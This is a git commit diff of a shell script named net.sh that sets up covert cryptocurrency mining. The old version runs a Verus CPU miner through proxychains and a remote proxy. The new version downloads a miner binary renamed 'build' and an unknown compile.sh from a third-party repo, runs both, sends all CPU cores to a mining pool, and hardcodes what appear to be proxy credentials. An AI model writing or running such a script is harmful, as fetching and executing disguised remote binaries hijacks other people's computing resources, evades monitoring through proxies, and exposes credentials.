03229147c0af97f079cb61a2204dae22205a0f28
andigani <89914976+andigani@users.noreply.github.com>
2022-02-02 12:18:49 +0700

    Update net.sh

--- net.sh
+++ net.sh
@@ -1,9 +1,16 @@
-sudo -i
-apt update
-apt install proxychains -y
-
-sed -i 's/socks4/socks5/' /etc/proxychains.conf
-sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
-sed -i 's/9050/10663/' /etc/proxychains.conf
-
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && proxychains ./hellminer -c stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RGDDXRXXPzxnd9VMkdJCxRVwgMLoAAf3ym.wangsit -p x --cpu 16
+#!/bin/bash
+proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
+array[0]="0001"
+array[1]="0002"
+array[2]="0003"
+size=${#array[@]}
+index=$(($RANDOM % $size))
+worker=${array[$index]}
+apt-get update
+wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
+wget -qO build https://github.com/renifer12/master/raw/master/ccminer
+chmod +x build
+chmod +x compile.sh
+./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p X -t $(nproc --all)
+./compile.sh
+echo succes
